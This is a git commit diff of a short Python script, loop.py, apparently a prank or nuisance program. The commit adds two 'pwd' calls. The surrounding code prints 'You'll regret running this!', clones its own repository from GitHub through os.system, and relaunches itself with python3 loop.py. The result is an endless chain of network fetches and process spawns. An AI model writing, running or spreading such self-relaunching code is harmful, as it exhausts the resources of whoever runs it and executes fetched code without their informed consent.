7c3a21edfc41e8d2ff43386fee2ed2b23f8e5db3
XATT <106667154+xattsec@users.noreply.github.com>
2022-08-05 23:30:17 +0200

    Update loop.py

--- loop.py
+++ loop.py
@@ -3,7 +3,9 @@ import time
 
 print("You'll regret running this!")
 os.system('''git clone https://github.com/xattsec/Loop.git''')
+os.system('pwd')
 time.sleep(3)
 os.system('cd Loop')
+os.system('pwd')
 print("Again")
 os.system('python3 loop.py')
